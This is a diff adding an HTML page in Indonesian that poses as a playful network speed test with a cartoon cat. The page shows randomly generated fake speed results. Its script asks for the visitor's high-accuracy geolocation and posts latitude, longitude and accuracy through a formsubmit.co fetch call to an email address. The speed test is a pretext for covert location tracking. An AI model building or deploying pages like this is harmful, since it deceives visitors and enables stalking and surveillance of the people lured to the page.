@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Speed Test 🚀</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Comic+Neue:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Comic Neue', system-ui, -apple-system, sans-serif;
+            background-color: #ffe6f2;
+            color: #ff6699;
+        }
+        
+        .pet {
+            animation: float 4s ease-in-out infinite;
+            will-change: transform;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-15px); }
+        }
+        
+        .btn-primary {
+            background-color: #ff85a2;
+            color: white;
+            transition: all 0.3s;
+        }
+        
+        .btn-primary:hover {
+            background-color: #ff6699;
+            transform: scale(1.05);
+        }
+        
+        .location-bubble {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col items-center justify-center p-4">
+    <div class="max-w-md w-full md:w-auto mx-2 md:mx-auto bg-white rounded-3xl shadow-lg p-4 md:p-8 text-center">
+        <h1 class="text-2xl md:text-4xl font-bold mb-4 md:mb-6 bg-gradient-to-r from-pink-500 to-purple-600 text-transparent bg-clip-text">⚡ Speed Test ⚡</h1>
+        
+        <img src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/86103ac4-2e40-4dc8-84d8-f88a43021f9d.png" alt="Cartoon cat with WiFi symbols" class="pet w-32 h-32 md:w-48 md:h-48 rounded-full border-4 border-pink-300 mx-auto mb-4 md:mb-6 hover:scale-105 transition-transform" loading="lazy">
+        
+        <div id="permissionMessage" class="mb-6 p-4 bg-pink-50 rounded-xl">
+            <p class="mb-4">Halo sayang 💖</p>
+            <p>Mari uji kecepatan jaringan Anda secara real-time untuk optimasi terbaik!</p>
+        </div>
+        
+        <div id="trackingUI" class="hidden">
+            <div class="location-bubble bg-pink-100 p-6 rounded-full mb-6">
+                <span id="locationStatus" class="text-xl md:text-2xl">🔍 Mencari...</span>
+                <div id="coordinates" class="mt-2 text-sm"></div>
+            </div>
+            
+            <div class="progress-container mb-6">
+                <div class="h-4 bg-pink-200 rounded-full overflow-hidden">
+                    <div id="progressBar" class="h-full bg-pink-500 rounded-full" style="width: 0%"></div>
+                </div>
+                <p id="progressText" class="mt-2 text-sm">Memproses permintaan...</p>
+            </div>
+            
+            <img src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/f2b2c4e1-104f-481b-b913-25f0b0c8b73c.png" alt="Animation of cute cat paws walking across the screen" class="mx-auto mb-6">
+            
+            <div id="results" class="hidden text-left bg-pink-50 p-4 rounded-xl mb-6">
+                <h3 class="font-bold mb-2 text-center">🎉 Hasil Tes Kecepatan</h3>
+                <div class="grid grid-cols-2 gap-4 mb-3">
+                    <div class="bg-white p-3 rounded-lg text-center">
+                        <div class="text-xl font-bold text-blue-500 mb-1">Download</div>
+                        <div id="downloadSpeed" class="text-xl md:text-2xl">0 Mbps</div>
+                    </div>
+                    <div class="bg-white p-3 rounded-lg text-center">
+                        <div class="text-xl font-bold text-green-500 mb-1">Upload</div>
+                        <div id="uploadSpeed" class="text-2xl">0 Mbps</div>
+                    </div>
+                </div>
+                <div class="text-center mb-2">
+                    <div class="text-sm mb-1">Ping: <span id="pingResult" class="font-bold">0 ms</span></div>
+                    <div class="text-sm">Jaringan: <span id="networkType" class="font-bold">-</span></div>
+                </div>
+                <p class="mt-2 text-xs text-pink-600 text-center">*Data akan digunakan untuk meningkatkan jaringan di area Anda</p>
+            </div>
+        </div>
+        
+        <button id="startBtn" class="btn-primary px-6 py-3 md:px-8 md:py-4 rounded-full font-bold text-base md:text-lg shadow transition hover:shadow-md active:scale-95 duration-200">
+            Mulai Tes Kecepatan 🚀
+        </button>
+    </div>
+
+    <script>
+        document.getElementById('startBtn').addEventListener('click', function() {
+            this.disabled = true;
+            this.textContent = "Memproses...";
+            
+            document.getElementById('permissionMessage').classList.add('hidden');
+            document.getElementById('trackingUI').classList.remove('hidden');
+            
+            simulateProgress();
+            
+            // Request geolocation as browser permission
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    showPosition, 
+                    handleError,
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            } else {
+                document.getElementById('locationStatus').textContent = "Browser tidak mendukung pelacakan lokasi";
+            }
+        });
+        
+        function simulateProgress() {
+            let progress = 0;
+            const progressBar = document.getElementById('progressBar');
+            const progressText = document.getElementById('progressText');
+            
+            const interval = setInterval(() => {
+                progress += 5 + Math.random() * 10;
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(interval);
+                    document.getElementById('results').classList.remove('hidden');
+                    progressText.textContent = "Selesai! Terima kasih ✨";
+                    document.getElementById('startBtn').disabled = false;
+                    document.getElementById('startBtn').textContent = "Tes Kembali 🚀";
+                    
+                    // Simulate speed test results
+                    setTimeout(() => {
+                        const downloadSpeed = (50 + Math.random() * 50).toFixed(2);
+                        const uploadSpeed = (10 + Math.random() * 30).toFixed(2);
+                        const pingTime = Math.floor(20 + Math.random() * 50);
+                        const networkTypes = ['WiFi', '4G', '5G', 'LAN'];
+                        const networkType = networkTypes[Math.floor(Math.random() * networkTypes.length)];
+                        
+                        document.getElementById('downloadSpeed').textContent = `${downloadSpeed} Mbps`;
+                        document.getElementById('uploadSpeed').textContent = `${uploadSpeed} Mbps`;
+                        document.getElementById('pingResult').textContent = `${pingTime} ms`;
+                        document.getElementById('networkType').textContent = networkType;
+                    }, 500);
+                } else {
+                    progressText.textContent = `Mengukur kecepatan ${Math.floor(progress)}%...`;
+                }
+                progressBar.style.width = `${progress}%`;
+            }, 500);
+        }
+        
+        function showPosition(position) {
+            const statusElement = document.getElementById('locationStatus');
+            const coordinatesElement = document.getElementById('coordinates');
+            
+            statusElement.textContent = "🏡 Lokasi ditemukan!";
+            coordinatesElement.innerHTML = `
+                <p>Latitude: ${position.coords.latitude.toFixed(6)}</p>
+                <p>Longitude: ${position.coords.longitude.toFixed(6)}</p>
+                <p class="text-xs mt-2">📍 Lokasi Anda telah direkam untuk analisis</p>
+            `;
+            
+            // In a real application, you would send this data to your server
+            console.log("Location captured:", position.coords);
+            logLocation(position.coords);
+        }
+        
+        function handleError(error) {
+            const statusElement = document.getElementById('locationStatus');
+            let message = "";
+            
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    message = "Izin diperlukan untuk membantu pencarian";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    message = "Informasi lokasi tidak tersedia";
+                    break;
+                case error.TIMEOUT:
+                    message = "Permintaan lokasi timeout";
+                    break;
+                case error.UNKNOWN_ERROR:
+                    message = "Terjadi kesalahan tidak diketahui";
+                    break;
+            }
+            
+            statusElement.textContent = `⚠️ ${message}`;
+            document.getElementById('progressBar').style.backgroundColor = "#ff9999";
+            document.getElementById('startBtn').disabled = false;
+            document.getElementById('startBtn').textContent = "Tes Kembali 🚀";
+        }
+        
+        function logLocation(coords) {
+            const locationData = {
+                latitude: coords.latitude,
+                longitude: coords.longitude,
+                accuracy: coords.accuracy,
+                timestamp: new Date().toISOString()
+            };
+            
+            console.log("Logging location data:", locationData);
+            
+            // Send data via email using FormSubmit
+            const formData = new FormData();
+            formData.append('_replyto', 'your-email@example.com');
+            formData.append('_subject', 'New Location Data');
+            formData.append('message', `New location data received:
+Latitude: ${locationData.latitude}
+Longitude: ${locationData.longitude}
+Accuracy: ${locationData.accuracy} meters
+Time: ${locationData.timestamp}`);
+            
+            // Only send location data if accurate enough
+            if (coords.accuracy <= 100) {
+                fetch('https://formsubmit.co/ajax/your-email@example.com', {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => console.log('Email sent:', data))
+                .catch(error => console.error('Error sending email:', error));
+            }
+        }
+    </script>
+</body>
+</html>
